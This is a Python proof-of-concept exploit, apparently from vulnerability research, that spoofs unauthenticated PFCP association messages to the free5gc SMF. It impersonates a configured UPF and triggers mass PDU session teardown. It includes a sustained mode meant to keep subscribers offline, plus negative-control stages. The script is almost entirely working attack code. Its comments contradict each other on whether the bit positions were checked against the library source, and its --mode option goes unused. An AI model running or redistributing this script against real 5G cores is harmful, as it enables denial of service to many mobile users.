#!/usr/bin/env python3
"""
b1_2_pfcp_assoc_release_poc.py -- free5gc SMF (v4.3.0) unauthenticated PFCP
(N4, UDP/8805) association spoofing -> mass PDU Session teardown.

PFCP in free5gc has no authentication, and the SMF takes the peer's identity
from the Node ID IE inside the datagram -- never from the UDP source address --
so any host that can send one UDP datagram to the SMF's N4 port can impersonate
a configured UPF. An Association Setup Request with a newer Recovery Time Stamp
invalidates the current association, an Association Update Request with the
SARR bit set makes the SMF release that UPF and terminate every PDU Session on
it, and a bare Association Release Request is accepted as a simpler third
primitive. `--stage both` fires the 47-octet two-stage sequence used for the
reported result; `--stage update-benign` / `--stage update-urss` are negative
controls that must be accepted without any teardown.

Usage
-----
    python3 b1_2_pfcp_assoc_release_poc.py --offline
    python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --port 8805 --upf-node-id 10.100.200.3 --stage both
    python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage release

`--offline` builds and prints every datagram without sending anything.
"""

import argparse
import binascii
import socket
import struct
import sys
import time

PFCP_VERSION_1 = 1 << 5   # 0x20
PFCP_F_SEID = 0x01

# PFCP message types (TS 29.244 Table 7.3-1)
MT_ASSOCIATION_SETUP_REQUEST = 5
MT_ASSOCIATION_UPDATE_REQUEST = 7
MT_ASSOCIATION_RELEASE_REQUEST = 9

# PFCP IE types (go-pfcp ie/ie.go)
IE_CAUSE = 19                       # ie.go:40
IE_UP_FUNCTION_FEATURES = 43        # ie.go:64
IE_NODE_ID = 60                     # ie.go:81
IE_RECOVERY_TIME_STAMP = 96         # ie.go:117
IE_PFCP_ASSOC_RELEASE_REQ = 111     # ie.go:132  (SARR / URSS flags)
IE_GRACEFUL_RELEASE_PERIOD = 112    # ie.go:133

# Node ID types. VERIFIED against the library, not against TS 29.244 prose:
#   deps/go-pfcp ie/node-id.go:17-19
#       NodeIDIPv4Address uint8 = 0
#       NodeIDIPv6Address uint8 = 1
#       NodeIDFQDN        uint8 = 2
# Consumed by the SMF at internal/pfcp/association.go:306-326.
NODE_ID_TYPE_IPV4 = 0
NODE_ID_TYPE_IPV6 = 1
NODE_ID_TYPE_FQDN = 2

# IE 111 (PFCP Association Release Request) is ONE octet of flags. go-pfcp tests
# the bits LSB-first, NOT with TS 29.244's "bit 1 = MSB" prose numbering:
#   deps/go-pfcp ie/pfcp-association-release-request.go:32-39
#       func (i *IE) HasSARR() bool { ... return has1stBit(v) }
#   deps/go-pfcp ie/pfcp-association-release-request.go:22-29
#       func (i *IE) HasURSS() bool { ... return has2ndBit(v) }
#   deps/go-pfcp ie/misc.go:35-37   func has1stBit(f uint8) bool { return (f & 0x01) == 1 }
#   deps/go-pfcp ie/misc.go:31-33   func has2ndBit(f uint8) bool { return (f&0x02)>>1 == 1 }
# and the encoder agrees:
#   deps/go-pfcp ie/pfcp-association-release-request.go:8-10
#       uint8((urss<<1)|(sarr))
# => SARR = 0x01, URSS = 0x02. Using 0x80 here would make HasSARR() false and the
#    mass-teardown primitive at association_state.go:78 would never fire.
SARR_BIT = 0x01
URSS_BIT = 0x02

NTP_EPOCH_DELTA = 2208988800  # 1900-01-01 -> 1970-01-01


def build_ie(ie_type, payload):
    return struct.pack(">HH", ie_type, len(payload)) + payload


def node_id_ie(value):
    """Encode IE 60 (Node ID). Accepts a dotted-quad IPv4, a 16-byte IPv6 or
    an FQDN string."""
    try:
        packed = socket.inet_aton(value)
        return build_ie(IE_NODE_ID, bytes([NODE_ID_TYPE_IPV4]) + packed)
    except OSError:
        pass
    if ":" in value:
        try:
            packed = socket.inet_pton(socket.AF_INET6, value)
            return build_ie(IE_NODE_ID, bytes([NODE_ID_TYPE_IPV6]) + packed)
        except OSError:
            pass
    return build_ie(IE_NODE_ID,
                    bytes([NODE_ID_TYPE_FQDN]) + value.encode("ascii"))


def recovery_time_stamp_ie(unix_seconds=None):
    """IE 96: 4 octets, seconds since 1900-01-01. A *newer* value than the one
    the SMF already holds additionally invalidates the association generation
    (association_state.go:33-46 AcceptRecoveryTimeStampForGeneration)."""
    if unix_seconds is None:
        unix_seconds = int(time.time()) + 3600
    return build_ie(IE_RECOVERY_TIME_STAMP,
                    struct.pack(">I", (unix_seconds + NTP_EPOCH_DELTA) & 0xFFFFFFFF))


def build_datagram(msg_type, seq, payload, seid_flag=False, seid=0):
    flags = PFCP_VERSION_1 | (PFCP_F_SEID if seid_flag else 0)
    hdr_tail = 4 + (8 if seid_flag else 0)
    out = struct.pack(">BBH", flags, msg_type, hdr_tail + len(payload))
    if seid_flag:
        out += struct.pack(">Q", seid)
    out += struct.pack(">I", (seq & 0xFFFFFF) << 8)
    return out + payload


def pkt_association_setup(node_id, seq=1, rts=None):
    """Step 1: claim to be the configured UPF. Unauthenticated."""
    body = node_id_ie(node_id) + recovery_time_stamp_ie(rts)
    return build_datagram(MT_ASSOCIATION_SETUP_REQUEST, seq, body)


def pkt_association_update_sarr(node_id, seq=2, graceful_period=None,
                                urss=False):
    """Step 2: request association release via SARR -> mass session teardown."""
    flags = SARR_BIT | (URSS_BIT if urss else 0)
    body = node_id_ie(node_id)
    body += build_ie(IE_PFCP_ASSOC_RELEASE_REQ, bytes([flags]))
    if graceful_period is not None:
        body += build_ie(IE_GRACEFUL_RELEASE_PERIOD,
                         struct.pack(">I", int(graceful_period)))
    return build_datagram(MT_ASSOCIATION_UPDATE_REQUEST, seq, body)


def pkt_association_update_benign(node_id, seq=2):
    """NEGATIVE CONTROL: an Association Update Request carrying ONLY the Node ID
    IE -- no IE 111 at all.  `request.PFCPAssociationReleaseRequest` is then nil,
    so `releaseRequested` at association_state.go:78 is false and the deferred
    function at :96-105 does NOT call releaseAssociationRequestedByUPF().

    The SMF still answers Cause=Request accepted, and still accepts the peer
    identity from the Node ID IE rather than from the source address -- so this
    control isolates the SARR bit as the sole trigger and rules out "any Update
    Request tears the sessions down".
    """
    return build_datagram(MT_ASSOCIATION_UPDATE_REQUEST, seq,
                          node_id_ie(node_id))


def pkt_association_update_urss(node_id, seq=2):
    """BIT-LEVEL CONTROL: IE 111 is present but ONLY the URSS bit (0x02) is set
    and SARR (0x01) is clear.

    In the SMF, association_state.go:79-84 logs
        "UPF[%s] reported that non-zero Usage Reports for affected PFCP
         Sessions were sent"
    for URSS, while :78 computes `releaseRequested = releaseRequest != nil &&
    releaseRequest.HasSARR()` = false, so the deferred function at :97-104 does
    NOT call releaseAssociationRequestedByUPF() and nothing is torn down.

    This control exists because the go-pfcp module source is not available
    offline in this workspace (go mod download fails: proxy.golang.org is
    unreachable), so the SARR/URSS bit positions cannot be cited from the
    library directly.  Setting 0x02 alone and observing the SMF log the URSS
    sentence while leaving every PDU Session alive proves from the target's own
    behaviour that bit 1 (0x01) is SARR and bit 2 (0x02) is URSS, matching
    TS 29.244 7.2.32 Figure 7.2.32-1.  It also proves the teardown is caused by
    the SARR bit specifically and not by the mere presence of IE 111.
    """
    return build_datagram(MT_ASSOCIATION_UPDATE_REQUEST, seq,
                          node_id_ie(node_id)
                          + build_ie(IE_PFCP_ASSOC_RELEASE_REQ,
                                     bytes([URSS_BIT])))


def pkt_association_release(node_id, seq=2):
    """Alternative single-step primitive (2): release the association."""
    return build_datagram(MT_ASSOCIATION_RELEASE_REQUEST, seq,
                          node_id_ie(node_id))


# --stage -> (list of (label, builder) pairs).  Each stage is a self-contained
# experiment; the harness runs them one per environment restart.
STAGES = {
    # the full defect: hijack the association, then ask for a graceful release
    "both":          (("AssociationSetupRequest", pkt_association_setup),
                      ("AssociationUpdateRequest(SARR=1)",
                       pkt_association_update_sarr)),
    # primitive (1) alone -- how much damage does the Setup hijack do by itself?
    "setup":         (("AssociationSetupRequest", pkt_association_setup),),
    # primitive (2)/SARR alone, with NO preceding spoofed Setup.  The SMF's own
    # association to the real UPF is live, so IsAssociated() passes and the
    # attacker-chosen Node ID alone is enough to select the victim UPF.
    "update-sarr":   (("AssociationUpdateRequest(SARR=1)",
                       pkt_association_update_sarr),),
    # NEGATIVE CONTROL: Update Request with no IE 111 -> must tear nothing down
    "update-benign": (("AssociationUpdateRequest(no SARR)",
                       pkt_association_update_benign),),
    "update-urss":   (("AssociationUpdateRequest(URSS=1, SARR=0)",
                       pkt_association_update_urss),),
    # the other single-step primitive: AssociationReleaseRequest
    "release":       (("AssociationSetupRequest", pkt_association_setup),
                      ("AssociationReleaseRequest", pkt_association_release)),
}


def parse_cause(resp):
    """Best-effort Cause extraction from a PFCP response, for operator feedback."""
    if resp is None or len(resp) < 8:
        return None
    off = 8  # node-related response: flags/type/len(4) + seq/spare(4)
    while off + 4 <= len(resp):
        t, ln = struct.unpack(">HH", resp[off:off + 4])
        if off + 4 + ln > len(resp):
            break
        if t == IE_CAUSE and ln >= 1:
            return resp[off + 4]
        off += 4 + ln
    return None


CAUSE_NAMES = {0: "Reserved", 1: "Request accepted", 64: "Request rejected",
               65: "Session context not found", 66: "Mandatory IE missing",
               67: "Conditional IE missing", 68: "Invalid length",
               69: "Mandatory IE incorrect", 70: "Invalid Forwarding Policy",
               71: "Invalid F-TEID allocation option",
               72: "No established PFCP association",
               73: "Rule creation/modification failure",
               74: "PFCP entity in failure"}


def cause_str(c):
    if c is None:
        return "(no response)"
    return "%d (%s)" % (c, CAUSE_NAMES.get(c, "?"))


def dump(name, pkt):
    print("  %-34s %3d octets  %s"
          % (name, len(pkt), binascii.hexlify(pkt).decode()))


def main():
    ap = argparse.ArgumentParser(
        description="free5gc SMF unauthenticated PFCP association spoofing "
                    "-> mass PDU Session teardown (B1-2)")
    ap.add_argument("--target", default=None, help="SMF N4 address")
    ap.add_argument("--port", type=int, default=8805, help="PFCP port (8805)")
    ap.add_argument("--upf-node-id", default="10.100.200.102",
                    help="Node ID of a UPF configured in the SMF (IPv4/IPv6/"
                         "FQDN). This is what RetrieveUPFNodeByNodeID() looks "
                         "up; it is NOT matched against the packet source.")
    ap.add_argument("--mode", choices=["sarr", "release"], default="sarr",
                    help="sarr = Association Update w/ SARR (mass session "
                         "teardown, new surface); release = Association "
                         "Release Request (pre-existing)")
    ap.add_argument("--graceful-period", type=int, default=None,
                    help="optional Graceful Release Period IE (seconds)")
    ap.add_argument("--seq", type=int, default=1, help="starting PFCP seq")
    ap.add_argument("--repeat", type=int, default=1,
                    help="repeat the sequence N times")
    ap.add_argument("--gap", type=float, default=0.5,
                    help="seconds between setup and update")
    ap.add_argument("--stage", choices=sorted(STAGES), default="both",
                    help="which primitive(s) to send. 'both' is the full defect "
                         "(Setup hijack + Update/SARR); 'setup', 'update-sarr' "
                         "and 'release' isolate each primitive; "
                         "'update-benign' is the negative control (Update with "
                         "no IE 111 -> must tear nothing down)")
    ap.add_argument("--interval", type=float, default=None,
                    help="sustained mode: re-send the whole stage every N "
                         "seconds until --duration elapses.  Used to show that "
                         "the UE cannot recover while the attack continues")
    ap.add_argument("--duration", type=float, default=60.0,
                    help="with --interval: how long to keep sending (default 60)")
    ap.add_argument("--offline", action="store_true",
                    help="build and print packets; send nothing")
    ap.add_argument("--dump-hex", action="store_true",
                    help="print full hex for each packet")
    args = ap.parse_args()

    print("=" * 76)
    print("B1-2  free5gc SMF -- unauthenticated PFCP association spoofing")
    print("      peer identity taken from Node ID IE, never from source addr")
    print("      sink: association.go:47/96/185 -> association_state.go:78,102")
    print("            -> association_release.go:45 (terminates every PDU Session)")
    print("=" * 76)
    print("[*] claimed UPF Node ID : %s" % args.upf_node_id)
    print("[*] mode                : %s" % args.mode)
    print("[*] stage               : %s" % args.stage)

    # Build this stage's packets.  --mode selects which step-2 primitive the
    # 'both'/'release' stages use; the explicit single-primitive stages ignore it.
    stage = STAGES[args.stage]
    pkts = []
    for idx, (label, builder) in enumerate(stage):
        seq = args.seq + idx
        if builder is pkt_association_setup:
            pkts.append((label, builder(args.upf_node_id, seq=seq)))
        elif builder is pkt_association_update_sarr:
            pkts.append((label, builder(args.upf_node_id, seq=seq,
                                        graceful_period=args.graceful_period)))
        else:
            pkts.append((label, builder(args.upf_node_id, seq=seq)))

    print("\n[+] datagrams:")
    for label, p in pkts:
        dump(label, p)
    if args.dump_hex:
        for label, p in pkts:
            print("\n%s hex: %s" % (label, binascii.hexlify(p).decode()))

    if args.offline:
        print("\n[offline] no packets sent.")
        print("[offline] Node ID IE  : %s"
              % binascii.hexlify(node_id_ie(args.upf_node_id)).decode())
        print("[offline] IE 111 payload: %s  (0x%02x = SARR set, LSB per ie/misc.go:35-37)"
              % (binascii.hexlify(bytes([SARR_BIT])).decode(), SARR_BIT))
        print("[offline] expected SMF behaviour:")
        print("          1) AssociationSetupRequest -> Cause=Request accepted")
        print("             (association_state.go:23-26 only requires the")
        print("              Node ID to match a CONFIGURED upf; no source check)")
        print("          2) AssociationUpdateRequest(SARR=1)")
        print("             -> releaseAssociationRequestedByUPF")
        print("             -> deletePFCPSessionsBeforeAssociationRelease")
        print("             -> every PDU Session on that UPF is terminated")
        return 0

    target = args.target or "127.0.0.1"
    dest = (target, args.port)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3.0)
    print("\n[*] sending to %s:%d" % dest)

    def send_once(round_no):
        for idx, (label, p) in enumerate(pkts):
            try:
                s.sendto(p, dest)
                try:
                    r, _ = s.recvfrom(65535)
                    print("[+] round %d step%d %-34s cause=%s"
                          % (round_no, idx + 1, label, cause_str(parse_cause(r))))
                except socket.timeout:
                    print("[!] round %d step%d %-34s no response (timeout)"
                          % (round_no, idx + 1, label))
            except OSError as e:
                print("[-] socket error: %s" % e, file=sys.stderr)
                return False
            if idx + 1 < len(pkts):
                time.sleep(args.gap)
        return True

    if args.interval is not None:
        deadline = time.time() + args.duration
        n = 0
        while time.time() < deadline:
            n += 1
            if not send_once(n):
                s.close()
                return 2
            time.sleep(args.interval)
        print("[*] sustained mode: %d rounds over %.0fs"
              % (n, args.duration))
    else:
        for i in range(args.repeat):
            if not send_once(i + 1):
                s.close()
                return 2
            if i + 1 < args.repeat:
                time.sleep(args.gap)

    s.close()
    print("\n[!] verify impact in the SMF log:")
    print("    - 'PFCP Association Release ... requested by UPF'")
    print("    - 'terminating PDU Session' / CollectAssociationReleasePDUSessions")
    print("    - all UEs on that UPF lose their PDU Sessions (N2 release to AMF)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
